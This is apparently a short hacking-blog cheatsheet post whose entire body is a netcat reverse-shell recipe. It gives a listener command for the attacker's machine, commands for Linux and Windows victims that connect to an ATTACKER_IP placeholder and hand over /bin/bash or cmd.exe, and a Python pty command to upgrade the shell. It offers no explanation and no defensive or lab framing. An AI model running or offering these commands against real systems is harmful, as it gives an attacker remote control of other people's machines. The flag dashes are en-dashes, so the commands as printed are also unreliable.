---
layout:     post
title:      Cheatsize | Netcat reverse shell
date:       2022-03-09 10:00:00
summary:    That's it. The few commands to execute to set up a reverse shell.
categories: Cheatsheet
thumbnail: wand-magic-sparkles
tags:
 - Hacking
 - Reverse shell
 - Netcat
 - Cheatsheet
---
```bash
//Attacker machine
nc –lvp <ARBITRARY_PORT>

//Victim machine - LINUX
nc <ATTACKER_IP> <SAME_ARBITRARY_PORT> –e /bin/bash

//Victim machine - WINDOWS
nc.exe <ATTACKER_IP> <SAME_ARBITRARY_PORT> –e cmd.exe

//Upgrade the shell via Python
python -c 'import pty; pty.spawn("/bin/bash")'
```